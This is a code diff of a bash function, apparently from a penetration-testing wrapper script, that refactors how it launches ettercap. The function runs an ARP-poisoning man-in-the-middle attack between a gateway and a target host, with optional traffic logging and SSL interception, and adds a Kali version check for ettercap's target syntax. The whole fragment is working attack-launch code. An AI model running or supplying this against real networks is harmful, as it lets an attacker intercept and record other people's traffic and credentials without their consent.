@@ -57,19 +57,27 @@ f_run(){
   #ettercap fails if the interface is down
   ip link set $interface up
 
-  if [ $logchoice -eq 1 ]; then
-    if [ $sslfakecert -eq 1 ]; then
-      ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/
-    else
-      ettercap -i $interface -T -S -q -l $filename -M arp:remote /$gw/ /$target1/
-    fi
+   # Check for Kali1 version for target syntax change...
+  dpkg --list ettercap-common | grep -q 1:0.8.2-2~kali1
+  if [ $? -eq 0 ]; then
+    syntax=""
   else
-    if [ $sslfakecert -eq 1 ]; then
-      ettercap -i $interface -T -q -M arp:remote /$gw/ /$target1/
-    else
-      ettercap -i $interface -T -S -q -M arp:remote /$gw/ /$target1/
-    fi
+    syntax="/"
   fi
+
+  if [ $logchoice -eq 1 ]; then
+    log="-l ${filename}"
+  else
+    log=""
+  fi
+
+  if [ $sslfakecert -eq 1 ]; then
+    ssl=""
+  else
+    ssl="--nosslmitm"
+  fi
+
+  ettercap -i $interface -T ${ssl} -q ${log} -M arp:remote ${syntax}/$gw/ ${syntax}/$target1/
 }
 
 f_banner
